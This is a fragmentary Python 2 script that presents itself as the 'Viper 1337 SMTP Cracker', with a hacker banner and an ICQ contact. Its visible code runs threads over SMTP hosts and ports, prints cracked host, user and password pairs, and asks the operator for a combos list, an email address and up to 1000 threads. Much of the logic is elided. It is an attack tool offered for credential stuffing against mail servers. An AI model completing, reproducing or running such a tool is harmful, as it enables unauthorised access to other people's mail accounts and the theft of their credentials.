...
class consumer(threading.Thread):
	...
	def findHost(self,host):
		...
		try:
			...
			pass
		print '\033[91m [-] NOT WORK: \033[91m'+host+"\n"
		cache[host]=[-1,-1]
		for i,p in enumerate(self.ports):
			for j,h in enumerate(self.hosts):
				
				try:
					print '\033[91m [-] NOT WORK: \033[91m'+h+host+':'+str(p)+"\n"
	...
	def connect(self,tupple,ssl=False):
		...
		print '\033[91m[+] SMTP CRACKED LOGS NEkim : \033[91m'+host+":"+port+" "+user+" "+passw+"\n"
		try:
...
try:
 ...
 | |
 | |_________
 |___________| : LOGS NEKIM
               ICQ : https://icq.im/aroula336
                                                                              

 \n
    \033[91mSMTP Cracker last Update 2021
 ...
 ''')
 inputs=open(raw_input('\033[91m[\033[92m+\033[91m]\033[92mCombos List : \033[93m '),'r').read().splitlines()
 email=raw_input("\033[91m[\033[92m+\033[91m]\033[92mYour Email : \033[93m ")#dont change this
 thret= raw_input("\033[91m[\033[92m+\033[91m]\033[92mThreads(Max:1000) : \033[93m ")#dont change this
 if int(thret)>1000:
	thret=1000
 print """ \033[93m[\033[91m!\033[93m] Viper 1337 SMTP Cracker\n 
 Recoder Mail : %s
 \033[94m[\033[92m/\033[94m] \033[93mEmail: > """%(email)
